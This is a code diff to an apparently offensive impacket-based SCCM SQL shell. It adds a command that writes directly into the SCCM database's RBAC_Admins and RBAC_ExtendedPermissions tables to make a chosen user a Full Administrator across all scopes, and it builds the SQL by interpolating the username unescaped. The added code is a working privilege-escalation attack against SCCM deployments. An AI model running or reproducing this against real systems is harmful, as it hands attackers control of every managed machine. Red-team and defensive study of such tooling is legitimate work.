@@ -9,6 +9,7 @@ import uuid
 from impacket.examples import logger
 from impacket.examples.utils import parse_target
 from impacket import version, tds
+from impacket.ldap import ldaptypes
 from datetime import datetime
 from binascii import hexlify, unhexlify
 from base64 import b64encode
@@ -186,8 +187,17 @@ class SCCM_SQLSHELL(cmd.Cmd):
             self.sql_query(line)
             self.sql.printReplies()
             self.sql.printRows()
-        except:
-            pass
+        except Exception as e:
+            print(f"Error: {e}")
+            exit(1)
+    
+    def __run_silent(self, line):
+        try:
+            self.sql_query(line)
+            return self.sql.rows
+        except Exception as e:
+            print(f"Error: {e}")
+            exit(1)
 
     def do_set_limit(self, limit):
         self._limit = limit
@@ -579,6 +589,31 @@ class SCCM_SQLSHELL(cmd.Cmd):
         except Exception as e:
             logging.error("Failed to load PowerShell script")
             logging.error(e)
+    
+    """
+    Add / remove admin users
+    """
+    def do_sccm_add_admin(self, arg=""):
+        split_arg = arg.split()
+        if len(split_arg) < 2:
+            logging.error("Did not get expected 2 arguments [username] and [role]")
+        username = split_arg[0]
+        role = " ".join(split_arg[1:])
+
+        logging.debug(f"Adding {username} to {role}")
+
+        # Grab SID
+        rows = self.__run_silent(f"SELECT SID0 FROM dbo.v_R_User WHERE Unique_User_Name0 = '{username}';")
+        sid = rows[0]['SID0']
+        logging.debug(f"Grabbed SID of {username}: {sid}")
+        hexsid = ldaptypes.LDAP_SID()
+        hexsid.fromCanonical(sid)
+        sid_enc = ('0x' + ''.join('{:02X}'.format(b) for b in hexsid.getData()))
+        logging.debug(f"Hex encoded SID: {sid_enc}")
+
+        # Add "Full Administrator" role
+        query = f"DECLARE @AdminID INT; USE CM_{self._site_code}; INSERT INTO RBAC_Admins (AdminSID, LogonName, IsGroup, IsDeleted, CreatedBy, CreatedDate, ModifiedBy, ModifiedDate, SourceSite) SELECT {sid_enc}, '{username}', 0, 0, '', '', '', '', '{self._site_code}' WHERE NOT EXISTS ( SELECT 1 FROM RBAC_Admins WHERE LogonName = '{username}' ); SET @AdminID = (SELECT TOP 1 AdminID FROM RBAC_Admins WHERE LogonName = '{username}'); INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID) SELECT @AdminID, RoleID, ScopeID, ScopeTypeID FROM (VALUES  ('SMS0001R', 'SMS00ALL', 29), ('SMS0001R', 'SMS00001', 1), ('SMS0001R', 'SMS00004', 1) ) AS V(RoleID, ScopeID, ScopeTypeID) WHERE NOT EXISTS ( SELECT 1 FROM RBAC_ExtendedPermissions  WHERE AdminID = @AdminID  AND RoleID = V.RoleID  AND ScopeID = V.ScopeID AND ScopeTypeID = V.ScopeTypeID );"
+        self.__run(query)
 
 if __name__ == "__main__":
 
